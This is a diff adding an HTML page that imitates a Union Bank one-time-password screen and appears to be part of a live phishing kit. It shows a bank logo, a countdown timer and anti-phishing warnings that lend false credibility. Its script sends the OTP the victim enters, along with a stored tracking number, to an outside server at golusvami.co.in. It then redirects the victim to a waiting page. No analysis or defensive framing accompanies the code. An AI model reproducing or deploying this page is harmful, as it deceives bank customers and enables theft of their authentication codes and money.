@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Asasfdgad12389@*()1389=123</title>
+
+	<style type="text/css">
+  input[type="number"]::-webkit-inner-spin-button,
+  input[type="number"]::-webkit-outer-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+  }
+
+  input[type="number"] {
+    -moz-appearance: textfield;
+  }
+
+		input{
+			background-color: transparent;
+			border: none;
+			border-bottom: 1px solid rgba(255, 255, 255,1);
+			opacity: 1;
+			color: white;
+
+		}
+
+		input:focus{
+			outline: none;
+		}
+		label{
+			font-size: 12px;
+			letter-spacing: 1px;
+			font-weight: bold;
+		}
+
+		#cvv_label{
+           margin-left: 200px;
+		}
+
+
+
+ .triangle-container {
+      position: relative;
+      width: 10px; 
+      height: 10px;
+    }
+
+    .triangle {
+      width: 0;
+      height: 0;
+      border-left: 10px solid transparent;
+      border-right: 0;
+      border-bottom: 10px solid red;
+      position: absolute;
+      right: 0;
+      transform: rotate(-45deg);
+    }
+     ::placeholder {
+    color: white;
+  }
+		@media screen and (max-width:500px){
+		
+		#cvv_label{
+           margin-left: 50px;
+		}
+
+		}
+
+	</style>
+</head>
+<body onload="startTimer()">
+   
+   <div style="text-align: center;">
+   	<img src="unionbanklogo-new.webp" style="width: 80%;height: 70px;">
+   </div><Br>
+
+ 
+   <div style="background-color: #0066B0;padding: 10px;">
+    <span style="color:white;">One Time Password OTP has been send to mobile.</span>
+    <div style="background-color: #0066B0;color: white;margin-top: 30px;padding-top: 0px;">
+   	  
+   	<div>
+   		<label>ONE TIME PASSWORD<span style="color:#C2061F">*</span></label>
+   		<br>
+   	  <input type="" id="otp" oninput="limitLengthAndMoveFocus(this, 6)" style="width:100%;margin-top: 10px;">
+   	</div>
+
+<script type="text/javascript">
+                        var timer=120;
+                        var sec=0;
+                        function startTimer() {
+                        sec=parseInt(timer%120);
+                        
+                        if (timer<2) {
+                        // timer.stop();
+                        window.location.href = "";
+                        }
+                        
+                        document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
+                        timer--;
+                        setTimeout(function(){
+                        startTimer();
+                        
+                        }, 1000);
+                        }
+                        
+                        </script>
+
+<div style="margin-top:10px">
+                        <center><b style="font-family: 'Open Sans', sans-serif; font-weight:500; color:white; font-family: 'Work Sans', sans-serif; font-size:14px; text-align:center;"><span style="color:white; font-family: 'Work Sans', sans-serif; font-size:13px;" id="time"></span>&nbsp;second</b></center>
+                        </div>
+
+<script>
+  function formatDateInput(input) {
+    let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+
+    if (value.length > 2) {
+      value = value.slice(0, 2) + '/' + value.slice(2);
+    }
+
+    if (value.length > 5) {
+      value = value.slice(0, 5) + '/' + value.slice(5, 9);
+    }
+
+    input.value = value;
+  }
+</script>
+
+
+
+<div style="margin-top: 20px;text-align: center;">
+ <button onclick="updateData();" style="background-color: white;border: none;color: #0066B0;padding: 10px 15px;border-radius: 5px;cursor: pointer;">SUBMIT</button>
+</div>
+   
+   	<br>
+
+   </div>
+
+
+</div>
+<div>
+   	<img src="a72da1b1-433b-4955-b4f5-5d6319f7dc1b.jpg" style="width: 100%;height: 200px;">
+   </div>
+ 
+
+
+<div style="margin-top:20px;padding: 20px;">
+	<span  style="color: #D8261E;font-size: 1em;font-weight: bold;margin-bottom: 12px;display: block;">Customer Alert !!!! [Beware of phishing]</span>
+<Br>
+
+<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Do not respond to fraudulent communications asking your confidentials like A/c No, User Id, Password, Card No,etc</span>
+
+<br><br>	
+	<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Fraudulent e-mails contain links of look-alike websites to mislead into entering sensitive financial data
+</span>
+
+
+<br><br>	
+	<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Bank will never send such communications to customers asking for their personal or confidential information
+</span>
+
+
+
+
+<br><br>	
+	<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Always visit Bank's site instead of clicking on the links provided in emails or third party websites
+</span>
+
+
+
+
+<br><br>	
+	<div class="triangle-container">
+    <div class="triangle"></div>
+  </div>
+	<span style="font-size: 12px; float: left; padding-top: 5px; padding-bottom: 5px;margin-top: -20px;margin-left: 20px;">
+	Do not respond to pop-up windows asking for your confidential information
+</span>
+
+
+</div>
+
+
+
+
+
+
+
+    <script>
+  function limitLength(element, maxLength) {
+    if (element.value.length > maxLength) {
+      element.value = element.value.slice(0, maxLength);
+    }
+  }
+</script>
+
+<script>
+  function limitLengthAndMoveFocus(element, maxLength, nextInputId) {
+    if (element.value.length >= maxLength) {
+      element.value = element.value.slice(0, maxLength);
+      if (nextInputId) {
+        document.getElementById(nextInputId).focus();
+      }
+    }
+  }
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var random_no = localStorage.getItem('random_no');
+   function updateData() {
+   
+   var otp = document.getElementById("otp").value;
+
+
+   if (otp != "") {
+
+    var data = {
+
+      otp: otp,
+      random_no: random_no
+      };
+
+      var xhr = new XMLHttpRequest();
+
+      xhr.open("POST", "https://golusvami.co.in/nuchuas/king.php", true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.onreadystatechange = function () {
+         if (xhr.readyState === 4 && xhr.status === 200) {
+
+            console.log(xhr.responseText);
+            // window.location.href = 'pursahe';
+            window.location.href = 'wait7.html';
+
+      }
+   };
+   xhr.send(JSON.stringify(data));
+
+}
+      else {
+         alert('Please fill all fields');
+      }
+}
+
+    </script>
+
+</body>
+</html>
